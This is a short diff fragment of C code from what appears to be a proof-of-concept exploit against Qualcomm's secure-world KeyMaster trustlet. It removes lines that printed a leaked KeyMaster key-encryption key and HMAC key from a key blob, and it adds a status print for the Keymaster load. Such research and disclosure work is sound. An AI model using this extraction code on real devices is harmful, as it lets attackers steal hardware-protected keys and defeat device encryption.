@@ -93,26 +93,14 @@ int main() {
 	size_t key_blob_length = 0;
         generate_keymaster_key(km_handle, &key_blob, &key_blob_length);
 	
-	//Extracting the keys from the key-blob
-	printf("-----------------------------------------------\n");
-	printf("[+] Leaked KeyMaster Keys!\n");
-
-	printf("[+] KeyMaster Key Encryption Key (KEK): ");
-	for (uint32_t i=0; i<KEK_LENGTH; i++)
-		printf("%02X", key_blob[i]);
-	printf("\n");
-
-	printf("[+] KeyMaster HMAC Key: ");
-	for (uint32_t i=0; i<HMAC_KEY_LENGTH; i++)
-		printf("%02X", key_blob[KEK_LENGTH + i]);
-	printf("\n");
-
 /*
 	//Unloading the widevine app
 	res = (*wv_handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&wv_handle->qseecom);
 	printf("[+] Widevine unload res: %d\n", res);
 */
-	if (res < 0) {
+
+	printf("[+] Keymaster load res: %d\n", res);
+        if (res < 0) {
 		perror("[-] Failed to load Keymaster");
 		return -errno;
 	}
